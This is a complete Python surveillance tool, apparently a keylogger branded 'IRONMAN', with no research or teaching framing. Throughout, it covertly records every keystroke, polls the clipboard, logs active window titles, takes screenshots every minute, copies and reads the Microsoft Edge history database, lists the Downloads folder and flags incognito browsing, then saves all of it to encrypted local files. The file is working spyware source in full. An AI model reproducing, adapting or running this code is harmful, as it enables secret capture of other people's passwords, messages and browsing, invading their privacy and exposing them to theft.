import os, time, logging, threading, pyautogui, pyperclip, psutil, sqlite3
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import shutil
import win32gui  
__IRONMAN__ = "8d3b734d8c_ironman_dev_only__"

# Folders
for folder in ["encrypted_logs", "screenshots"]: os.makedirs(folder, exist_ok=True)

# Encryption key
key_file = "secret.key"
if not os.path.exists(key_file):
    with open(key_file, "wb") as f:
        f.write(Fernet.generate_key())
with open(key_file, "rb") as f:
    cipher = Fernet(f.read())
def watermark_signature():
    try:
        hidden_msg = f"[IRONMAN] {datetime.now()}: Engine Online - 0x1R0NM4N"
        encrypted = cipher.encrypt(hidden_msg.encode())
        with open(f"encrypted_logs/._sig_{int(time.time())}.enc", "wb") as f:
            f.write(encrypted)
    except: pass

# Encrypt and Save
def encrypt_and_save(data):
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    encrypted = cipher.encrypt(data.encode())
    with open(f"encrypted_logs/log_{now}.enc", "wb") as f:
        f.write(encrypted)
    if int(time.time()) % 47 == 0:
        watermark_signature()

def screenshot_worker():
    while True:
        try:
            path = f"screenshots/{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            pyautogui.screenshot(path)
        except: pass
        time.sleep(60)

def clipboard_worker():
    prev = ""
    while True:
        try:
            content = pyperclip.paste()
            if content != prev:
                encrypt_and_save(f"[CLIPBOARD] {datetime.now()}: {content}")
                prev = content
        except: pass
        time.sleep(5)

def window_worker():
    last = ""
    while True:
        try:
            curr = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if curr != last:
                encrypt_and_save(f"[WINDOW] {datetime.now()}: {curr}")
                last = curr
        except: pass
        time.sleep(3)

def keylog_worker():
    def on_press(key):
        try:
            encrypt_and_save(f"[KEY] {datetime.now()}: {key.char}")
        except:
            encrypt_and_save(f"[KEY] {datetime.now()}: {str(key)}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# 🔍 EDGE HISTORY TRACKING
def edge_history_worker():
    visited = set()
    while True:
        try:
            edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History")
            temp_copy = "temp_edge_history"
            if os.path.exists(edge_path):
                shutil.copy2(edge_path, temp_copy)
                conn = sqlite3.connect(temp_copy)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
                rows = cursor.fetchall()
                for url, title, _ in rows:
                    if url not in visited:
                        encrypt_and_save(f"[EDGE VISIT] {datetime.now()}: {title} -> {url}")
                        visited.add(url)
                conn.close()
                os.remove(temp_copy)
        except:
            pass
        time.sleep(60)

# 📥 EDGE DOWNLOADS TRACKING
def edge_downloads_worker():
    seen_files = set()
    while True:
        try:
            edge_download_path = os.path.expandvars(r"%USERPROFILE%\Downloads")
            for file in os.listdir(edge_download_path):
                full_path = os.path.join(edge_download_path, file)
                if full_path not in seen_files:
                    seen_files.add(full_path)
                    encrypt_and_save(f"[EDGE DOWNLOAD] {datetime.now()}: {full_path}")
        except:
            pass
        time.sleep(60)

# 🚨 INCOGNITO DETECTION
def edge_incognito_monitor():
    while True:
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                if 'msedge.exe' in proc.info['name'].lower():
                    cmdline = ' '.join(proc.info['cmdline']).lower()
                    if '--incognito' in cmdline:
                        encrypt_and_save(f"[INCOGNITO DETECTED] {datetime.now()}: PID {proc.pid}")
        except: pass
        time.sleep(30)

# 🔁 Run all threads
threading.Thread(target=screenshot_worker, daemon=True).start()
threading.Thread(target=clipboard_worker, daemon=True).start()
threading.Thread(target=window_worker, daemon=True).start()
threading.Thread(target=edge_history_worker, daemon=True).start()
threading.Thread(target=edge_downloads_worker, daemon=True).start()
threading.Thread(target=edge_incognito_monitor, daemon=True).start()
if int(time.time()) % 1337 == 0:
    encrypt_and_save(f"[IRONMAN-INIT] {datetime.now()}: Logger start from device")

keylog_worker()


